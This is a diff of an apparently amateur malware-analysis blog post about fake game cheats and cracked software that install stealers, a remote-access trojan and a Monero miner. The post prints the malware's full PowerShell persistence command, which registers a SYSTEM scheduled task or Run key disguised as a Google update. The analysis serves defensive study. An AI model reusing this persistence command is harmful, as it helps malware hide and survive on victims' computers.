@@ -156,7 +156,7 @@ So I fired up my FlareVM (shoutout Mandiant), and put the binary on the system, 
 
 Next, I opened up **Process Hacker** and **x64dbg**, Process Hacker showed me that the binary was opening a cmd shell and executing some hidden commands from that, so I tried to find the place in memory where this was happening with x64dbg. Now, I am not very experienced with this tool but I am trying to learn it as it is one of the more popular debuggers out there and its apparently very good for malware analysis. Unfortunately, I wasn't able to find the address in memory where the cmd shell was being executed so i couldnt analyse it further, but I knew something was happening in that cmd shell and I wasn't going to stop until i found out what it was.
 
-Finally, I opened up **ProcMon** to monitor what processes the binary was opening and what else it was doing under the hood. I created a filter for **"if (Process Name) is (".exe) then (include) in the list.** I opened the binary and this worked perfectly, I was able to see the commands that the cmd shell was running.
+Finally, I opened up **ProcMon** to monitor what processes the binary was opening and what else it was doing under the hood. I created a filter for **"if (Process Name) is ("cmd.exe") then (include) in the list.** I opened the binary and this worked perfectly, I was able to see the commands that the cmd shell was running.
 
 <img src="/images/ezbat.png" alt= "batcommand" width="90%" height="90%">
 
@@ -212,7 +212,7 @@ The binary stops & deletes the registry entries for the following services:
 
 *I guess the binary REALLY doesn't want us to get the latest security updates..* 🤣
 
-Next up, the binary runs & adds to startup what seems to be **another** backdoor called ```updater.exe``` with the following command:
+Next up, the binary copies itself & adds itself to startup with Administrator privileges, renaming itself to ```updater.exe``` with the following command:
 
 ```powershell.exe <#xjwvbygm#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { IF([System.Environment]::OSVersion.Version -lt [System.Version]"6.2") { schtasks /create /f /sc onlogon /rl highest /ru 'System' /tn 'GoogleUpdateTaskMachineQC' /tr '''C:\Program Files\Google\Chrome\updater.exe''' } Else { Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\updater.exe')  -Trigger (New-ScheduledTaskTrigger -AtStartup)  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName 'GoogleUpdateTaskMachineQC' -User 'System' -RunLevel 'Highest' -Force; } } Else { reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "GoogleUpdateTaskMachineQC"/t REG_SZ /f /d 'C:\Program Files\Google\Chrome\updater.exe' }, ```
 
@@ -222,3 +222,21 @@ Finally, just in case the second cmd.exe command didn't work, cmd.exe runs all t
 
 <img src="/images/4cmdstopservice2.png" alt= "4cmdstopservice" width="75%" height="75%">
 
+Again, VirusTotal says that this binary connects to ```xmr.2miners.com```, so it is a highly probable chance that this is some XMR mining malware.
+
+So, overall, what do we have here?
+1. **A build of Rhadamanthys Stealer**
+2. **A build of DCRAT**
+3. **Some sort of privilege escalation/token impersonation method**
+4. **A Steam phishing page & possibly another CoinMiner (**
+5. **Probably an XMR Miner and Windows Update Service disabler**
+
+All of which enable themselves to execute on startup, ensuring persistence on the victims device.
+
+Oh and incase you were wondering, all of the "Cheats", "Spoofers", "Cracked Paid Software" etc etc all download the same **"Gloader by Dv9.rar"** archive.
+
+<img src="/images/allthesame.png" alt= "4cmdstopservice" width="70%" height="70%">
+
+I think that wraps up just about everything to do with this/these malware(s)! lol
+
+Thank you for reading, and stay tuned for my next writeup! :)
